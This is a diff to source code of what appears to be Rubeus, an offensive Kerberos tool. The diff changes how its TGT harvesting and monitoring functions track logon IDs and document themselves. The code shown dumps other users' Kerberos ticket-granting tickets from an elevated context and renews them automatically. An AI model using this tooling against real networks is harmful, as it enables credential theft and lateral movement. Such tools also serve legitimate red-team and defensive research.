@@ -8,20 +8,20 @@ namespace Rubeus
 {
     public class Harvest
     {
+        /// <summary>First extract all TGTs then monitor the event log (indefinitely) for 4624
+        /// logon events every 'intervalMinutes' and dumps TGTs JUST for the specific logon IDs
+        /// (LUIDs) based on the event log. On each interval, renew any tickets that are about
+        /// to expire and refresh the cache. End result: every "intervalMinutes" a set of currently
+        /// valid TGT .kirbi files are dumped to console</summary>
+        /// <param name="intervalMinutes"></param>
         public static void HarvestTGTs(int intervalMinutes)
         {
-            // First extract all TGTs then monitor the event log (indefinitely) for 4624 logon events
-            //  every 'intervalMinutes' and dumps TGTs JUST for the specific logon IDs (LUIDs) based on the event log.
-            // On each interval, renew any tickets that are about to expire and refresh the cache.
-            // End result: every "intervalMinutes" a set of currently valid TGT .kirbi files are dumped to console
             if (!Helpers.IsHighIntegrity()) {
                 Console.WriteLine("\r\n[X] You need to have an elevated context to dump other users' Kerberos tickets :( \r\n");
                 return;
             }
-
             Console.WriteLine("[*] Action: TGT Harvesting (w/ auto-renewal)");
             Console.WriteLine("\r\n[*] Monitoring every {0} minutes for 4624 logon events\r\n", intervalMinutes);
-
             // used to keep track of LUIDs we've already dumped
             Dictionary<uint, bool> seenLUIDs = new Dictionary<uint, bool>();
             // get the current set of TGTs
@@ -123,7 +123,7 @@ namespace Rubeus
                 return;
             }
             // used to keep track of LUIDs we've already dumped
-            Dictionary<uint, bool> seenLUIDs = new Dictionary<uint, bool>();
+            Dictionary<Interop.LUID, bool> seenLUIDs = new Dictionary<Interop.LUID, bool>(Interop.LUID.EqualityComparer.Singleton);
 
             Console.WriteLine("[*] Action: TGT Monitoring");
             Console.WriteLine("[*] Monitoring every {0} seconds for 4624 logon events", intervalSeconds);
@@ -176,7 +176,7 @@ namespace Rubeus
                                 if (match2.Success) {
                                     try {
                                         // check if we've seen this LUID before
-                                        uint luid = Convert.ToUInt32(match2.Groups["id"].Value, 16);
+                                        Interop.LUID luid = new Interop.LUID(match2.Groups["id"].Value);
                                         if (!seenLUIDs.ContainsKey(luid)) {
                                             seenLUIDs[luid] = true;
                                             // if we haven't seen it, extract any TGTs for that particular logon ID
